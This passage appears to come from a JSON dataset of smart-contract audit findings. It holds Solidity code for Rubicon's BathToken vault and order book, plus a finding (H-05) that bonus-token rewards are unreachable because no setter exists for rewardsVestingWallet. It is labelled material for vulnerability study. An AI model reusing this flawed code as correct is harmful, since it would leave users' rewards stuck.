_rank[id].delb = block.number; //mark _rank[id] for deletion\n        return true;\n    }\n\n    //Hide offer from the unsorted order book (does not cancel offer)\n    function _hide(\n        uint256 id //id of maker offer to remove from unsorted list\n    ) internal returns (bool) {\n        uint256 uid = _head; //id of an offer in unsorted offers list\n        uint256 pre = uid; //id of previous offer in unsorted offers list\n\n        require(!isOfferSorted(id)); //make sure offer id is not in sorted offers list\n\n        if (_head == id) {\n            //check if offer is first offer in unsorted offers list\n            _head = _near[id]; //set head to new first unsorted offer\n            _near[id] = 0; //delete order from unsorted order list\n            return true;\n        }\n        while (uid > 0 && uid != id) {\n            //find offer in unsorted order list\n            pre = uid;\n            uid = _near[uid];\n        }\n        if (uid != id) {\n            //did not find offer id in unsorted offers list\n            return false;\n        }\n        _near[pre] = _near[id]; //set previous unsorted offer to point to offer after offer id\n        _near[id] = 0; //delete order from unsorted order list\n        return true;\n    }\n\n    function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {\n        feeBPS = _newFeeBPS;\n        return true;\n    }\n\n    /// @dev unused deprecated function for applying a token distribution on top of a trade\n    function setAqueductDistributionLive(bool live)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductDistributionLive = live;\n        return true;\n    }\n\n    /// @dev unused deprecated variable for applying a token distribution on top of a trade\n    function setAqueductAddress(address _Aqueduct)\n        external\n        auth\n        returns (bool)\n    {\n        AqueductAddress = _Aqueduct;\n        return true;\n    }\n\n    function setFeeTo(address newFeeTo) external auth returns (bool) {\n        feeTo = newFeeTo;\n        return true;\n    }\n}\n\ninterface IWETH {\n    function deposit() external payable;\n\n    function transfer(address to, uint256 value) external returns (bool);\n\n    function withdraw(uint256) external;\n\n    function approve(address guy, uint256 wad) external returns (bool);\n}\n\ninterface IAqueduct {\n    function distributeToMakerAndTaker(address maker, address taker)\n        external\n        returns (bool);\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress \ud83d\udcc8\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public rewardsVestingWallet;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n\n        // Complete constract instantiation\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).transfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets) public returns (uint256 shares) {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)\n        public\n        view\n        returns (uint256 maxAssets)\n    {\n        if (totalSupply == 0) {\n            maxAssets = 0;\n        } else {\n            uint256 ownerShares = balanceOf[owner];\n            maxAssets = convertToAssets(ownerShares);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        if (totalSupply == 0) {\n            shares = 0;\n        } else {\n            uint256 amountWithdrawn;\n            uint256 _fee = assets.mul(feeBPS).div(10000);\n            amountWithdrawn = assets.sub(_fee);\n            shares = convertToShares(amountWithdrawn);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public returns (uint256 shares) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        uint256 expectedShares = previewWithdraw(assets);\n        uint256 assetsReceived = _withdraw(expectedShares, receiver);\n        require(\n            assetsReceived >= assets,\n            \"You cannot withdraw the amount of assets you expected\"\n        );\n        shares = expectedShares;\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function maxRedeem(address owner) public view returns (uint256 maxShares) {\n        return balanceOf[owner];\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function previewRedeem(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        uint256 r = (underlyingBalance().mul(shares)).div(totalSupply);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        assets = r.sub(_fee);\n    }\n\n    /// @notice * EIP 4626 *\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public returns (uint256 assets) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        assets = _withdraw(shares, receiver);\n    }\n\n    /// *** Internal Functions ***\n\n    /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n    function _deposit(uint256 assets, address receiver)\n        internal\n        returns (uint256 shares)\n    {\n        uint256 _pool = underlyingBalance();\n        uint256 _before = underlyingToken.balanceOf(address(this));\n\n        // **Assume caller is depositor**\n        underlyingToken.transferFrom(msg.sender, address(this), assets);\n        uint256 _after = underlyingToken.balanceOf(address(this));\n        assets = _after.sub(_before); // Additional check for deflationary tokens\n\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(_pool);\n\n        // Send shares to designated target\n        _mint(receiver, shares);\n        emit LogDeposit(\n            assets,\n            underlyingToken,\n            shares,\n            msg.sender,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Deposit(msg.sender, msg.sender, assets, shares);\n    }\n\n    /// @notice Withdraw share for the user and send underlyingToken to receiver with any accrued yield and incentive tokens\n    function _withdraw(uint256 _shares, address receiver)\n        internal\n        returns (uint256 amountWithdrawn)\n    {\n        uint256 _initialTotalSupply = totalSupply;\n\n        // Distribute network rewards first in order to handle bonus token == underlying token case; it only releases vested tokens in this call\n        distributeBonusTokenRewards(receiver, _shares, _initialTotalSupply);\n\n        uint256 r = (underlyingBalance().mul(_shares)).div(_initialTotalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.transfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.transfer(receiver, amountWithdrawn);\n\n        emit LogWithdraw(\n            amountWithdrawn,\n            underlyingToken,\n            _shares,\n            msg.sender,\n            _fee,\n            feeTo,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Withdraw(\n            msg.sender,\n            receiver,\n            msg.sender,\n            amountWithdrawn,\n            _shares\n        );\n    }\n\n    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern. Fees sit on BathBuddy to act as effectively accrued to the pool.\n    function distributeBonusTokenRewards(\n        address receiver,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply\n    ) internal {\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                // Note: Shares already burned in Bath Token _withdraw\n\n                // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n                //  are released their relative share of this pool, of vested BathBuddy rewards\n                // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n                if (rewardsVestingWallet != IBathBuddy(0)) {\n                    rewardsVestingWallet.release(\n                        (token),\n                        receiver,\n                        sharesWithdrawn,\n                        initialTotalSupply,\n                        feeBPS\n                    );\n                }\n            }\n        }\n    }\n\n    /// *** ERC - 20 Standard ***\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /// @notice EIP 2612\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"bathToken: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The underlying ERC-20 that this bathToken handles\n    function underlyingERC20() external view returns (address) {\n        return address(underlyingToken);\n    }\n\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n    }\n}\n\n\n// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity >=0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\ninterface IBathBuddy {\n    /// @notice Releases the withdrawer's relative share of all vested tokens directly to them with their withdrawal\n    /// @dev Modified function of the underlying to only release the user's relative share and send it directly to them\n    function release(\n        IERC20 token,\n        address recipient,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply,\n        uint256 poolFee\n    ) external;\n}\n\n\n",
        "CodeNames": [
            "BathBuddy.sol",
            "RubiconMarket.sol",
            "BathToken.sol",
            "IBathBuddy.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-05",
                "Location": [
                    "//solidity\nfunction distributeBonusTokenRewards(\n    address receiver,\n    uint256 sharesWithdrawn,\n    uint256 initialTotalSupply\n) internal {\n    if (bonusTokens.length  0) {\n        for (uint256 index = 0; index < bonusTokens.length; index++) {\n            IERC20 token = IERC20(bonusTokens[index]);\n            // Note: Shares already burned in Bath Token _withdraw\n\n            // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n            //  are released their relative share of this pool, of vested BathBuddy rewards\n            // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n            if (rewardsVestingWallet != IBathBuddy(0)) {\n                rewardsVestingWallet.release(\n                    (token),\n                    receiver,\n                    sharesWithdrawn,\n                    initialTotalSupply,\n                    feeBPS\n                );\n            }\n        }\n    }\n}\n"
                ],
                "Type": " BathToken LPs Unable To Receive Bonus Token Due To Lack Of Wallet Setter Method",
                "Description": "\nBathBuddy is a Vesting Wallet that payout withdrawers any bonusTokens they may have accrued while staking in the Bath Token (e.g. network incentives/governance tokens).\n\nBathBuddy Vesting Wallet releases a user their relative share of the pool\u2019s total vested bonus token during the withdraw call on BathToken.sol. This vesting occurs linearly over Unix time.\n\nIt was observed that the BathToken LPs are unable to receive any bonus tokens from the BathBuddy Vesting Wallet during withdraw and the bonus tokens are struck in the BathBuddy Vesting Wallet.\n\n\nThe following shows that the address of the BathBuddy Vesting Wallet is stored in the rewardsVestingWallet state variable and it is used to call the release function to distribute bonus to the BathToken withdrawers.\n\n<https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L629\n\nsolidity\nfunction distributeBonusTokenRewards(\n    address receiver,\n    uint256 sharesWithdrawn,\n    uint256 initialTotalSupply\n) internal {\n    if (bonusTokens.length  0) {\n        for (uint256 index = 0; index < bonusTokens.length; index++) {\n            IERC20 token = IERC20(bonusTokens[index]);\n            // Note: Shares already burned in Bath Token _withdraw\n\n            // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n            //  are released their relative share of this pool, of vested BathBuddy rewards\n            // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n            if (rewardsVestingWallet != IBathBuddy(0)) {\n                rewardsVestingWallet.release(\n                    (token),\n                    receiver,\n                    sharesWithdrawn,\n                    initialTotalSupply,\n                    feeBPS\n                );\n            }\n        }\n    }\n}\n\n\nHowever, there is no setter method to initialise the value of the rewardsVestingWallet state variable in the contracts. Therefore, the value of rewardsVestingWallet will always be zero. Note that Solidity only create a default getter for public state variable, but does not create a default setter.\n\nSince rewardsVestingWallet is always zero, the condition if (rewardsVestingWallet != IBathBuddy(0)) will always be evaluated as false. Thus, the code block rewardsVestingWallet.release will never be reached.\n\n\nLoss of Fund for the users. BathToken LPs are not able to receive their bonusToken.\n\n",
                "Repair": "\nImplement a setter method for the rewardsVestingWallet state variable in the contracts so that it can be initialised with BathBuddy Vesting Wallet address.\n\nbghughes (Rubicon) confirmed(https://github.com/code-423n4/2022-05-rubicon-findings/issues/107) \n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Benjamin Hughes - Rubicon\n/// @notice This contract is a router to interact with the low-level functions present in RubiconMarket and Pools\npragma solidity =0.7.6;\npragma abicoder v2;\n\nimport \"./RubiconMarket.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"./peripheral_contracts/WETH9.sol\"; // @unsupported: ovm\nimport \"./interfaces/IBathToken.sol\";\n\n///@dev this contract is a high-level router that utilizes Rubicon smart contracts to provide\n///@dev added convenience and functionality when interacting with the Rubicon protocol\ncontract RubiconRouter {\n    using SafeMath for uint256;\n\n    address public RubiconMarketAddress;\n\n    address payable public wethAddress;\n\n    bool public started;\n\n    event LogNote(string, uint256);\n\n    event LogSwap(\n        uint256 inputAmount,\n        address inputERC20,\n        uint256 hurdleBuyAmtMin,\n        address targetERC20,\n        bytes32 indexed pair,\n        uint256 realizedFill,\n        address recipient\n    );\n\n    receive() external payable {}\n\n    fallback() external payable {}\n\n    function startErUp(address _theTrap, address payable _weth) external {\n        require(!started);\n        RubiconMarketAddress = _theTrap;\n        wethAddress = _weth;\n        started = true;\n    }\n\n    /// @notice Get the outstanding best N orders from both sides of the order book for a given pair\n    /// @dev The asset/quote pair ordering will affect return values - asset should be the top of the pair: for example, (ETH, USDC, 10) will return (10 best ETH asks, 10 best USDC bids, 10)\n    /// @param asset the ERC20 token that represents the ask/sell side of the order book\n    /// @param quote the ERC20 token that represents the bid/buy side of the order book\n    /// @param topNOrders the depth of the order book the caller would like to query/view for the asset-quote pair\n    /// @dev \"best\" orders are determined by proximity to the midpoint of the pair. Closest to the midpoint is best order.\n    /// @return Fixed arrays (of topNOrders length) in \"best\" order (returned asks/bids[0] is best and asks/bids[topNOrders] is worst) of asks and bids + topNOrders. Each offer array item is: [pay, buy, offerId]\n    function getBookFromPair(\n        ERC20 asset,\n        ERC20 quote,\n        uint256 topNOrders\n    )\n        public\n        view\n        returns (\n            uint256[3][] memory,\n            uint256[3][] memory,\n            uint256\n        )\n    {\n        uint256[3][] memory asks = new uint256[3][](topNOrders);\n        uint256[3][] memory bids = new uint256[3][](topNOrders);\n        address _RubiconMarketAddress = RubiconMarketAddress;\n\n        //1. Get best offer for each asset\n        uint256 bestAskID = RubiconMarket(_RubiconMarketAddress).getBestOffer(\n            asset,\n            quote\n        );\n        uint256 bestBidID = RubiconMarket(_RubiconMarketAddress).getBestOffer(\n            quote,\n            asset\n        );\n\n        uint256 lastBid = 0;\n        uint256 lastAsk = 0;\n        //2. Iterate from that offer down the book until topNOrders\n        for (uint256 index = 0; index < topNOrders; index++) {\n            if (index == 0) {\n                lastAsk = bestAskID;\n                lastBid = bestBidID;\n\n                (\n                    uint256 _ask_pay_amt,\n                    ,\n                    uint256 _ask_buy_amt,\n\n                ) = RubiconMarket(_RubiconMarketAddress).getOffer(bestAskID);\n                (\n                    uint256 _bid_pay_amt,\n                    ,\n                    uint256 _bid_buy_amt,\n\n                ) = RubiconMarket(_RubiconMarketAddress).getOffer(bestBidID);\n                